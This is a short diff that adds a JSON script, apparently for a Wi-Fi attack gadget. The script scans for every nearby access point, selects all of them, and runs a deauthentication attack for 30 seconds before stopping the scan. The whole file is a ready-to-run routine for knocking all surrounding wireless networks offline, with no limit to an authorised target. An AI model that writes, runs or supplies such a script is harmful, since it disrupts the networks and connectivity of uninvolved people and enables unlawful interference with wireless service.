@@ -1,0 +1,37 @@
+{
+  "meta": {
+    "description": "Scan all APs then deauth all found networks",
+    "repeat": 1,
+    "enableLed": true,
+    "savePcap": false
+  },
+  "stages": [
+    {
+      "scan": {
+        "type": "ap",
+        "timeout": 10
+      }
+    },
+    {
+      "select": {
+        "type": "ap",
+        "criteria": "all"
+      }
+    },
+    {
+      "exec": {
+        "cmd": "attack -t deauth"
+      }
+    },
+    {
+      "delay": {
+        "seconds": 30
+      }
+    },
+    {
+      "exec": {
+        "cmd": "stopscan"
+      }
+    }
+  ]
+}
